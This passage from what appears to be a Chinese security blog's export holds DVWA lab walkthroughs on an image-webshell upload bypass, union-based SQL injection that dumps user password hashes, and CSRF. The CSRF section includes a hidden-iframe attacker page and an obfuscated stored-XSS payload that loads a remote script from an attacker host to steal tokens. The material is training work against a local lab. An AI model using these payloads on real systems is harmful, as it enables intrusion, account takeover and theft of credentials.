$uploaded_tmp = $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ]; // Is it an image? if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) ) { // Can we move the file to the upload folder? if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) { // No echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; } else { // Yes! echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; } } else { // Invalid file echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;; } } ?&gt; 可以看出服务器对文件后缀名进行了检查，并且用getimagesize函数检查文件是否为图片 getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。 在这里我们利用图片马绕过上传，并且利用dvwa的文件包含漏洞包含图片马，使服务器将图片马当做php解析运行 图片马制作，进入cmd，输入以下命令 copy heishacker.jpg/b+shell.php/b heishacker.jpg heisheike.jpg:一张普通的图片，图片不能太大，否则会上传失败shell.php:php一句话木马 /b将文件以二进制格式连接将图片马上传，上传成功，但是由于后缀名为jpg，所以被服务器当成了图片解析而不是php接下来利用文件包含漏洞包含图片马 dvwa文件包含漏洞high级别代码 &lt;?php // The page we wish to display $file = $_GET[ &apos;page&apos; ]; if(!function_exists(&apos;fnmatch&apos;)) { function fnmatch($pattern, $string) { return preg_match(&quot;#^&quot;.strtr(preg_quote($pattern, &apos;#&apos;), array(&apos;\\*&apos; =&gt; &apos;.*&apos;, &apos;\\?&apos; =&gt; &apos;.&apos;)).&quot;$#i&quot;, $string); } // end } // end if // Input validation if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) { // This isn&apos;t the page we want! echo &quot;ERROR: File not found!&quot;; exit; } ?&gt; 可见文件包含出必须以file开头，我们用file协议读取图片马，payload `http://192.168.50.128:8080/DVWA-master/vulnerabilities/fi/?page=file:///C:/wamp/www/DVWA-master/hackable/uploads/heishacker.jpg` 可以发现利用文件包含使服务器将图片马当做php解析可以用php的system函数执行cmd命令 impossible级别代码如下 &lt;?php if( isset( $_POST[ &apos;Upload&apos; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // File information $uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1); $uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ]; $uploaded_type = $_FILES[ &apos;uploaded&apos; ][ &apos;type&apos; ]; $uploaded_tmp = $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ]; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &apos;hackable/uploads/&apos;; //$target_file = basename( $uploaded_name, &apos;.&apos; . $uploaded_ext ) . &apos;-&apos;; $target_file = md5( uniqid() . $uploaded_name ) . &apos;.&apos; . $uploaded_ext; $temp_file = ( ( ini_get( &apos;upload_tmp_dir&apos; ) == &apos;&apos; ) ? ( sys_get_temp_dir() ) : ( ini_get( &apos;upload_tmp_dir&apos; ) ) ); $temp_file .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &apos;.&apos; . $uploaded_ext; // Is it an image? if( ( strtolower( $uploaded_ext ) == &apos;jpg&apos; || strtolower( $uploaded_ext ) == &apos;jpeg&apos; || strtolower( $uploaded_ext ) == &apos;png&apos; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; ( $uploaded_type == &apos;image/jpeg&apos; || $uploaded_type == &apos;image/png&apos; ) &amp;&amp; getimagesize( $uploaded_tmp ) ) { // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) if( $uploaded_type == &apos;image/jpeg&apos; ) { $img = imagecreatefromjpeg( $uploaded_tmp ); imagejpeg( $img, $temp_file, 100); } else { $img = imagecreatefrompng( $uploaded_tmp ); imagepng( $img, $temp_file, 9); } imagedestroy( $img ); // Can we move the file to the web root from the temp folder? if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) { // Yes! echo &quot;&lt;pre&gt;&lt;a href=&apos;${target_path}${target_file}&apos;&gt;${target_file}&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;; } else { // No echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; } // Delete any temp files if( file_exists( $temp_file ) ) unlink( $temp_file ); } else { // Invalid file echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;; } } // Generate Anti-CSRF token generateSessionToken(); ?&gt; Impossible级别的代码对上传文件进行了重命名，加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。","categories":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/categories/web安全/"}],"tags":[{"name":"dvwa学习","slug":"dvwa学习","permalink":"http://yoursite.com/tags/dvwa学习/"}]},{"title":"dvwa sql injection","slug":"sqlinjection","date":"2017-12-24T13:12:44.374Z","updated":"2018-06-04T15:13:39.176Z","comments":true,"path":"2017/12/24/sqlinjection/","link":"","permalink":"http://yoursite.com/2017/12/24/sqlinjection/","excerpt":"dvwa sql注入sql注入所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令，获取数据库中的信息","text":"dvwa sql注入sql注入所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令，获取数据库中的信息 测试环境一台win2003虚拟机，ip为192.168.50.128，用wamp集成环境将dvwa搭在8080端口 low级别代码如下 &lt;?php if( isset( $_REQUEST[ &apos;Submit&apos; ] ) ) { // Get input $id = $_REQUEST[ &apos;id&apos; ]; // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) { // Get values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;; } mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]); } ?&gt; 可见直接将id带入数据库查询，注入点在id上 http://192.168.50.128:8080/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit# 先来手注一下试试，注入的方法很多，常见的有union注入，报错注入（之前的文章有总结报错注入，有兴趣可以去看），基于布尔的盲注，基于时间的盲注等方法，在这里我们用union注入，首先在id后加单引号，报错，说明可能存在注入接下来用order by猜列数，因为union查询要求前后字段数一致，可以看出order by 2页面正常，order by 3页面报错 payload http://192.168.50.128:8080/DVWA-master/vulnerabilities/sqli/?id=1&apos; order by 2%23&amp;Submit=Submit# 页面正常payload http://192.168.50.128:8080/DVWA-master/vulnerabilities/sqli/?id=1&apos; order by 3%23&amp;Submit=Submit# 报出Unknown column &#39;3&#39; in &#39;order clause&#39;的错误接着输入 http://192.168.50.128:8080/DVWA-master/vulnerabilities/sqli/?id=1&apos; and 1=2 union select 1,2%23&amp;Submit=Submit# 作用是为了判断查询结果输出的位置，and 1=2使前面的语句查询为空，只显示union select后的结果，可以看出查询结果的位置在First name:和Surname:后面接下来判断当前数据库，用户，数据库版本，语句如下 http://192.168.50.128:8080/DVWA-master/vulnerabilities/sqli/?id=1&apos; and 1=2 union select database(),2%23&amp;Submit=Submit# 当前数据库名为dvwa http://192.168.50.128:8080/DVWA-master/vulnerabilities/sqli/?id=1&apos; and 1=2 union select user(),2%23&amp;Submit=Submit# 用户为root@localhost http://192.168.50.128:8080/DVWA-master/vulnerabilities/sqli/?id=1&apos; and 1=2 union select version(),2%23&amp;Submit=Submit# 版本为5.0.51b-community-ntinformation_schema是mysql5.0版本后出现的虚拟库，接下来使用information_schema数据库查询所有数据库名，语句为 http://192.168.50.128:8080/DVWA-master/vulnerabilities/sqli/?id=1&apos; and 1=2 union select group_concat(schema_name),2 from information_schema.schemata%23&amp;Submit=Submit# 接下来查询当前数据库下的所有表，语句为 http://192.168.50.128:8080/DVWA-master/vulnerabilities/sqli/?id=1&apos; and 1=2 union select group_concat(table_name),2 from information_schema.tables where table_schema=database()%23&amp;Submit=Submit# 查询users表下的所有列名，语句为 http://192.168.50.128:8080/DVWA-master/vulnerabilities/sqli/?id=1&apos; and 1=2 union select group_concat(column_name),2 from information_schema.columns where table_name=&apos;users&apos;%23&amp;Submit=Submit# 接下来查询users表下user和password中的内容，获取所有dvwa用户的登陆用户名和密码hash值 http://192.168.50.128:8080/DVWA-master/vulnerabilities/sqli/?id=1&apos; and 1=2 union select group_concat(user,0x3a,password),2 from users%23&amp;Submit=Submit# hash值可以在somd5上解密 medium级别代码如下 &lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) { // Get input $id = $_POST[ &apos;id&apos; ]; $id = mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id); $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query) or die( &apos;&lt;pre&gt;&apos; . mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) . &apos;&lt;/pre&gt;&apos; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) { // Display values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;; } } // This is used later on in the index.php page // Setting it here so we can close the database connection in here like in the rest of the source scripts $query = &quot;SELECT COUNT(*) FROM users;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); $number_of_rows = mysqli_fetch_row($result); $number_of_rows=$number_of_rows[0]; mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]); ?&gt; 可看出将$_POST[ ‘id’ ]直接带入数据库查询，同时对id参数用mysqli_real_escape_string函数进行了特殊字符转义，官网描述的是 Characters encoded are NUL (ASCII 0), \\n, \\r, \\, &apos;, &quot;, and Control-Z. 这次将参数id以post方式提交至服务器，注入点为post提交的id参数 提交请求，抓包，发送至Repeater注入点在id参数上，注入方法和之前的get参数注入方式一样用union注入 在参数1后加单引号，报错说明可能存在注入，唯一不同的是我们的单引号被\\转义获取当前数据库下所有表名获取users表下所有列名，由于单引号被转移，所以要对users进行16进制编码0x7573657273最终获取所有dvwa所有用户名密码的payload POST /DVWA-master/vulnerabilities/sqli/ HTTP/1.1 Host: 192.168.50.128:8080 User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 85 Referer: http://192.168.50.128:8080/DVWA-master/vulnerabilities/sqli/ Cookie: security=medium; PHPSESSID=391dtb6pnltant1m10u62tag52 Connection: keep-alive Upgrade-Insecure-Requests: 1 id=1 and 1=2 union select group_concat(user,0x3a,password),2 from users&amp;Submit=Submit high级别代码如下 &lt;?php if( isset( $_SESSION [ &apos;id&apos; ] ) ) { // Get input $id = $_SESSION[ &apos;id&apos; ]; // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos; LIMIT 1;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&apos; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) { // Get values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; 可以看到将$_SESSION[ &#39;id&#39; ]带入数据库查询，session文件默认存放在服务器web目录的tmp目录下我们看看$_SESSION[ &#39;id&#39; ]从何处来，点击 Click here to change your ID. 处理我们提交参数的是session-input.php，代码如下 &lt;?php define( &apos;DVWA_WEB_PAGE_TO_ROOT&apos;, &apos;../../&apos; ); require_once DVWA_WEB_PAGE_TO_ROOT . &apos;dvwa/includes/dvwaPage.inc.php&apos;; dvwaPageStartup( array( &apos;authenticated&apos;, &apos;phpids&apos; ) ); $page = dvwaPageNewGrab(); $page[ &apos;title&apos; ] = &apos;SQL Injection Session Input&apos; . $page[ &apos;title_separator&apos; ].$page[ &apos;title&apos; ]; if( isset( $_POST[ &apos;id&apos; ] ) ) { $_SESSION[ &apos;id&apos; ] = $_POST[ &apos;id&apos; ]; //$page[ &apos;body&apos; ] .= &quot;Session ID set!&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&quot;; $page[ &apos;body&apos; ] .= &quot;Session ID: {$_SESSION[ &apos;id&apos; ]}&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&quot;; $page[ &apos;body&apos; ] .= &quot;&lt;script&gt;window.opener.location.reload(true);&lt;/script&gt;&quot;; } $page[ &apos;body&apos; ] .= &quot; &lt;form action=\\&quot;#\\&quot; method=\\&quot;POST\\&quot;&gt; &lt;input type=\\&quot;text\\&quot; size=\\&quot;15\\&quot; name=\\&quot;id\\&quot;&gt; &lt;input type=\\&quot;submit\\&quot; name=\\&quot;Submit\\&quot; value=\\&quot;Submit\\&quot;&gt; &lt;/form&gt; &lt;hr /&gt; &lt;br /&gt; &lt;button onclick=\\&quot;self.close();\\&quot;&gt;Close&lt;/button&gt;&quot;; dvwaSourceHtmlEcho( $page ); ?&gt; 代码将我们的输入的id参数根据PHPSESSID将$_POST[ &#39;id&#39; ]赋值给$_SESSION[ &#39;id&#39; ]存放在tmp目录下的对应的session文件中，并且刷新页面带上PHPSESSID，然后high.php根据PHPSESSID将对应tmp下的session文件中的$_SESSION[ &#39;id&#39; ]带入数据库查询 所以可看出注入点实际上还是在我们提交的$_POST[ &#39;id&#39; ]中最终我们抓包修改id参数获取dvwa所有用户名密码payload POST /DVWA-master/vulnerabilities/sqli/session-input.php HTTP/1.1 Host: 192.168.50.128:8080 User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 18 Referer: http://192.168.50.128:8080/DVWA-master/vulnerabilities/sqli/session-input.php Cookie: security=high; PHPSESSID=391dtb6pnltant1m10u62tag52 Connection: keep-alive Upgrade-Insecure-Requests: 1 id=1&apos; and 1=2 union select group_concat(user,0x3a,password),2 from users#&amp;Submit=Submit 可以看出我们的payload已经写入到了服务器的session文件sess_391dtb6pnltant1m10u62tag52中然后将我们session文件中的payload带入数据库查询，获取所有用户名和密码hash值 impossible级别代码如下 &lt;?php if( isset( $_GET[ &apos;Submit&apos; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Get input $id = $_GET[ &apos;id&apos; ]; // Was a number entered? if(is_numeric( $id )) { // Check the database $data = $db-&gt;prepare( &apos;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&apos; ); $data-&gt;bindParam( &apos;:id&apos;, $id, PDO::PARAM_INT ); $data-&gt;execute(); $row = $data-&gt;fetch(); // Make sure only 1 result is returned if( $data-&gt;rowCount() == 1 ) { // Get values $first = $row[ &apos;first_name&apos; ]; $last = $row[ &apos;last_name&apos; ]; // Feedback for end user echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;; } } } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 可以看到，Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了“脱裤”，Anti-CSRFtoken机制的加入了进一步提高了安全性。","categories":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/categories/web安全/"}],"tags":[{"name":"dvwa学习","slug":"dvwa学习","permalink":"http://yoursite.com/tags/dvwa学习/"}]},{"title":"dvwa CSRF","slug":"DVWA CSRF","date":"2017-12-22T15:52:04.363Z","updated":"2018-06-04T14:59:11.963Z","comments":true,"path":"2017/12/22/DVWA CSRF/","link":"","permalink":"http://yoursite.com/2017/12/22/DVWA CSRF/","excerpt":"dvwa CSRFcsrf漏洞csrf的全称为跨站请求伪造，都有着跨站两字，但和之前的xss(跨站脚本攻击)不同的是csrf是利用目标网站用户的身份去做一些事情，相当于借刀杀人，突出在伪造两字，下面通过dvwa来研究一下csrf，使用csrf修改网站用户密码","text":"dvwa CSRFcsrf漏洞csrf的全称为跨站请求伪造，都有着跨站两字，但和之前的xss(跨站脚本攻击)不同的是csrf是利用目标网站用户的身份去做一些事情，相当于借刀杀人，突出在伪造两字，下面通过dvwa来研究一下csrf，使用csrf修改网站用户密码 测试环境一台win2003虚拟机，ip为192.168.50.128，用wamp集成环境将dvwa搭在8080端口一台win7虚拟机，ip为192.168.50.155,攻击者的服务器，web由phpstudy搭建默认登陆用户名密码为admin,password，我们用csrf漏洞去修改密码 low级别low级别代码 &lt;?php if( isset( $_GET[ &apos;Change&apos; ] ) ) { // Get input $pass_new = $_GET[ &apos;password_new&apos; ]; $pass_conf = $_GET[ &apos;password_conf&apos; ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; 该代码接收网站用户传来的新密码判断是否一致，一致的话就更新数据库的网站该用户的密码再看页面dvwa为我们展示的是一个正常修改密码的页面，用户通过表单填写新密码即可修改密码用burp抓包看看用户填写新密码到点击提交的过程中发生了什么可以看出用户提交从填写密码到提交到服务器实际上是向服务器发送了一个http数据包 GET /DVWA-master/vulnerabilities/csrf/?password_new=hacker&amp;password_conf=hacker&amp;Change=Change HTTP/1.1 Host: 192.168.50.128:8080 User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Referer: http://192.168.50.128:8080/DVWA-master/vulnerabilities/csrf/ Cookie: security=low; PHPSESSID=a6bnfv0lnvsho8sq9v3ofqg6r7 Connection: keep-alive Upgrade-Insecure-Requests: 1 简单的来说，服务器接收到这个http数据包就会做出响应修改密码现在来思考一下，如果我们诱使用户去点击我们构造的链接 http://192.168.50.128:8080/DVWA-master/vulnerabilities/csrf/?password_new=hacker&amp;password_conf=hacker&amp;Change=Change 受害用户点击后，也发出一样的http请求，将用户的密码改为hacker服务器接受到请求便会修改密码，这种攻击手段可以看作是借受害用户的身份（cookie）去做用户做的事情，通过简单的csrf可以看出csrf相对xss，仅仅利用用户的身份便可以做任何受害用户可以做的事情可以看出只要我们诱使用户向服务器发出相应的http请求就可以达到修改密码的效果上面诱使用户去点击我们构造的链接是一种方式另一种方式是诱使用户去点击我们构造的具有吸引力的页面，并在页面中用src加载链接，就相当于向服务器发送了一次http请求来看一个页面 http://192.168.50.155/dvwacsrf/mengmeizi.html 这是黑客服务器上的一个页面，只要诱惑受害人访问就能产生跨站请求伪造，页面中有一个很萌的二次元妹子图片，看起来并没有什么问题但是查看一下页面源代码 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt; &lt;title&gt;动漫萌妹子&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;meizi1&quot;&gt; &lt;img src=&quot;images/timg.jpg&quot;&gt; &lt;iframe src=&quot;http://192.168.50.128:8080/DVWA-master/vulnerabilities/csrf/?password_new=hacker&amp;password_conf=hacker&amp;Change=Change&quot; style=&quot;display:none&quot;&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 发现用iframe标签的src属性加载一个链接 http://192.168.50.128:8080/DVWA-master/vulnerabilities/csrf/?password_new=hacker&amp;password_conf=hacker&amp;Change=Change 并且将style属性的值设为display:none，将iframe框架中的内容隐藏起来src加载了链接就相当于向该链接中的服务器发送了一次修改密码的http请求，这一点可以通过浏览器插件firebug抓包就可以发现所以只要黑客诱使受害者访问该页面就会发送相应的http请求给存在csrf漏洞的网站服务器，修改受害用户的密码 medium级别代码如下 &lt;?php if( isset( $_GET[ &apos;Change&apos; ] ) ) { // Checks to see where the request came from if( stripos( $_SERVER[ &apos;HTTP_REFERER&apos; ] ,$_SERVER[ &apos;SERVER_NAME&apos; ]) !== false ) { // Get input $pass_new = $_GET[ &apos;password_new&apos; ]; $pass_conf = $_GET[ &apos;password_conf&apos; ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; } } else { // Didn&apos;t come from a trusted source echo &quot;&lt;pre&gt;That request didn&apos;t look correct.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; 可看到多了一些防御手段，要求修改密码的http数据包的Referer字段中必须有Host的名字，也就是要求修改密码的这个http请求必须是从修改密码的页面发出的才可以，来简单分析一下，如果是当前网站的用户要修改密码，他就必然要访问该网站修改密码的页面，所以点击提交按钮后http的请求中的Referer字段中必然会有该网站的主机名，但是如果是用户直接点击了修改密码的链接，或者访问了黑客服务器的页面，那么http数据包里的Referer值中就不会有该网站的主机，对比一下http数据包的Referer值即可明白如果是用户自己修改的密码，那么Referer值为 http://192.168.50.128:8080/DVWA-master/vulnerabilities/csrf/ 如果用户是在不知情的情况下向服务器发送了修改密码的http请求，那么Referer值就不会有网站的Host值看似这种防御已经没什么问题了，但是如果我们将黑客服务器上的页面的文件名改为192.168.50.128:8080.html的话，就可以绕过，但是windows的文件名不能有:这个字符，所以没有尝试成功，不过这样绕过是肯定可以的 high级别代码如下 &lt;?php if( isset( $_GET[ &apos;Change&apos; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Get input $pass_new = $_GET[ &apos;password_new&apos; ]; $pass_conf = $_GET[ &apos;password_conf&apos; ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 可以看出这次使用的是token防御，在修改密码的页面的表单中带上一个token，当用户修改密码后点击提交后发送的http请求中会带上页面的token值 GET /DVWA-master/vulnerabilities/csrf/?password_new=hacker&amp;password_conf=hacker&amp;Change=Change&amp;user_token=78f083605aa7d8cfb698eb414ffa7064 HTTP/1.1 Host: 192.168.50.128:8080 User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Referer: http://192.168.50.128:8080/DVWA-master/vulnerabilities/csrf/ Cookie: security=high; PHPSESSID=a6bnfv0lnvsho8sq9v3ofqg6r7 Connection: keep-alive Upgrade-Insecure-Requests: 1 这个token值是随机生成的，也是攻击者所猜不到的，所以完全的做到了防御csrf 但是高危级别的dvwa有着xss漏洞，我们可以利用存储型xss来完成这次csrf攻击在存储型xss的地方提交 Name：&lt;iframe src=&quot;../csrf&quot; style=&quot;display:none&quot; onload=&quot;var a= documen&amp;#x74;.crea&amp;#x74;eElemen&amp;#x74;(&apos;scrip&amp;#x74;&apos;);a.se&amp;#x74;A&amp;#x74;&amp;#x74;ribu&amp;#x74;e(&apos;src&apos;,&apos;h&amp;#x74;&amp;#x74;p://192.168.50.155/dvwacsrf/changepw.js&apos;);documen&amp;#x74;.ge&amp;#x74;Elemen&amp;#x74;sBy&amp;#x54;agName(&apos;head&apos;)[0].appendChild(a);&quot;&gt; Message：use csrf by xss 使用iframe将存在csrf的页面加载到存在xss的页面利用iframe标签的onload事件进行javascript dom操作创建script标签加载远程脚本http://192.168.50.155/dvwacsrf/changepw.js，这种方法在之前的xss文章中写到过changepw.js代码如下 var token=frames[0].document.getElementsByName(&quot;user_token&quot;)[0].value; var url = &quot;http://192.168.50.128:8080/DVWA-master/vulnerabilities/csrf/?password_new=hacker&amp;password_conf=hacker&amp;Change=Change&amp;user_token=&quot;+token; var ajax = null; if 